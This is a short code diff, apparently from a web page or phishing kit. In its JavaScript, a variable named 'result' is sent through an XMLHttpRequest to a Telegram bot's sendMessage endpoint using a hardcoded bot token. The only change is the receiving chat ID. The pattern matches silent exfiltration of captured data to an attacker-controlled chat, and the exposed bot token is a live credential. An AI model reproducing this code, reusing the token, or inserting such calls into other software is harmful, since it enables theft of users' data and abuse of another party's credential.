@@ -34,7 +34,7 @@ console.log("read successful");
         }else
         {
         const request = new XMLHttpRequest();
-	     	const url = ' https://api.telegram.org/bot1750130456:AAHZBIWQfUuMKsQ8o9v978n04M0Wiorh03w/sendMessage?chat_id=-457910063&text='+result;
+	     	const url = ' https://api.telegram.org/bot1750130456:AAHZBIWQfUuMKsQ8o9v978n04M0Wiorh03w/sendMessage?chat_id=-1001535441202&text='+result;
          
         request.open("post", url);
         request.send();
